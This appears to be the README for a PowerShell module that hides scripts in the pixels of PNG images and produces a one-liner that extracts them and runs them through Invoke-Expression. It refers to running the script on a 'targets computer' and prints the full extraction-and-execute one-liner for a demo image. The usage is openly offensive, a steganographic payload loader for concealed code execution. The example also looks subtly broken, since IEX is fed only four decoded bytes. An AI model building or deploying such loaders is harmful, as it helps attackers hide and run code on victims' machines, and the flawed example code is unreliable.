
# Invoke-PixelScript

based on original work by: [Invoke-PsImage](https://github.com/peewpw/Invoke-PSImage)

Invoke-PixelScript is a PowerShell module designed to embed PowerShell scripts within the pixels of an image file (PNG). This module provides a way to execute hidden scripts from these images, effectively using steganography to conceal and transport PowerShell scripts.

## Features

- **Embed Scripts in Images**: Hide PowerShell scripts in the least significant bits of image pixels.
- **Execute from Image**: Generate a one-liner to execute the embedded script directly from the image.

## Prerequisites

Before you begin using Invoke-PixelScript, ensure you have PowerShell installed on your system. This module also requires the .NET System.Drawing assembly, typically available by default in Windows environments. 

## Installation

```powershell
# Install the module
Install-Module PsInPic

# Import the module
Import-Module PsInPic
```

## Usage

### Embedding a Script into an Image

To embed a PowerShell script into an image, you can use the `Invoke-PixelScript` function.

```
PARAMETERS

$Script   - path to .ps1 script you want to embed 
$Image    - path to the image you plan to use
$Out      - path to the output file
$ExecPath - path to where you anticipate running the script from the targets computer 
            (can be altered whenever and will default to $Out if nothing is provided)
```

```powershell
# Embed a script into an existing image and save the output
$payload = Invoke-PixelScript -Script "C:\path\to\script.ps1" -Image "C:\path\to\image.png" -Out "C:\path\to\output.png" -ExecPath "C:\path\to\output.png"
```

### Generating the Execution Command

After embedding, the function returns a PowerShell one-liner that you can use to execute the script directly from the image:

```powershell
# Execute the embedded script from the image
Invoke-Expression $payload
```

### EXAMPLE

If you right click and save this image to your downloads folder as `out.png` and then run that powershell code below it you will open the calculator
(smaller the image the faster it is)

<img src="https://github.com/Unit-259/PsInPic/blob/main/out.png" width="400" alt="Description of Image">

```powershell
sal a New-Object;Add-Type -A System.Drawing;
$g=a System.Drawing.Bitmap("$env:userprofile\downloads\out.png");
$o=a Byte[] 7001382;
(0..2821)|%{
foreach($x in 0..2480) {
$p=$g.GetPixel($x, $_);
$o[$_*2481+$x]=[math]::Floor(($p.R -band 0x0F)*16) + ($p.G -band 0x0F);
}
};
$g.Dispose();
IEX([System.Text.Encoding]::ASCII.GetString($o[0..3]))
```

## Contributing

Contributions to the Invoke-PixelScript project are welcome! Please feel free to fork the repository, make your changes, and submit a pull request.

